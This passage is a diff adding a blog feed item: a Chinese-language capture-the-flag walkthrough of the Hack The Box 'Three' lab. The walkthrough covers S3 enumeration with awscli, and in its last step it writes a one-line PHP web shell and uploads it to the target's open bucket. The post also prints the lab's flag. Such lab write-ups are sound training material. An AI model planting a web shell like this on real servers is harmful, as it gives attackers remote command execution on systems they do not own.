+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ff02::2         ip6-allrouters
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.129.92.138 thetoppers.htb s3.thetoppers.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102222748117.png&#34;
+	width=&#34;1128&#34;
+	height=&#34;265&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102222748117_hu11935991691105386944.png 480w, https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102222748117_hu14419024900427833113.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261102222748117&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;425&#34;
+		data-flex-basis=&#34;1021px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Amazon S3 是 AWS 推出的对象存储服务。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：Amazon S3&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which command line utility can be used to interact with the service running on the discovered sub-domain?&lt;/p&gt;
+&lt;p&gt;可以使用哪个命令行实用程序与在已发现的子域上运行的服务进行交互？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# apt install awscli
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;awscli 用于在终端调用 AWS 各个服务的 API。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：awscli&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which command is used to set up the AWS CLI installation?&lt;/p&gt;
+&lt;p&gt;用于设置 AWS CLI 安装的命令是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# aws configure                                                    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;aws login&amp;#39;&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AWS Access Key ID &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;None&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: spike
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AWS Secret Access Key &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;None&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: spike
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Default region name &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;None&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: spike
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Default output format &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;None&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: spike
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里我全部设为 spike。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：aws configure&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What is the command used by the above utility to list all of the S3 buckets?&lt;/p&gt;
+&lt;p&gt;上述工具用来列出所有 S3 存储桶的命令是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# aws --endpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                           PRE images/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2026-11-02 08:28:49          &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; .htaccess
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2026-11-02 08:28:49      &lt;span class=&#34;m&#34;&gt;11952&lt;/span&gt; index.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;答案：aws s3 ls&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-9&#34;&gt;Task 9
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;This server is configured to run files written in what web scripting language?&lt;/p&gt;
+&lt;p&gt;此服务器配置为运行用哪种 Web 脚本语言编写的文件？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102223551186.png&#34;
+	width=&#34;1336&#34;
+	height=&#34;282&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102223551186_hu1945571007716566901.png 480w, https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102223551186_hu8729606312559138627.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261102223551186&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;473&#34;
+		data-flex-basis=&#34;1137px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;通过访问 &lt;code&gt;index.php&lt;/code&gt; / &lt;code&gt;index.asp&lt;/code&gt; / &lt;code&gt;index.aspx&lt;/code&gt; / &lt;code&gt;index.py&lt;/code&gt;，如果某一个返回了和首页一样的页面，那就是服务器的后端语言。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：PHP&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;submit-single-flag&#34;&gt;Submit Single Flag
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Submit the flag located in /var/www/.&lt;/p&gt;
+&lt;p&gt;提交位于 /var/www/ 中的 flag。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php system($_GET[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; &amp;gt; shell.php 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# aws --endpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;upload: ./shell.php to s3://thetoppers.htb/shell.php 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102230149857.png&#34;
+	width=&#34;1600&#34;
+	height=&#34;205&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102230149857_hu10440886687880825566.png 480w, https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102230149857_hu9774558685098963874.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261102230149857&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;780&#34;
+		data-flex-basis=&#34;1873px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：a980d99281a28d638ac68b9bf9453c2b&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>8. Responder</title>
         <link>https://Sp1ke-sec.github.io/p/8.-responder/</link>
         <pubDate>Mon, 02 Nov 2026 13:25:49 +0800</pubDate>
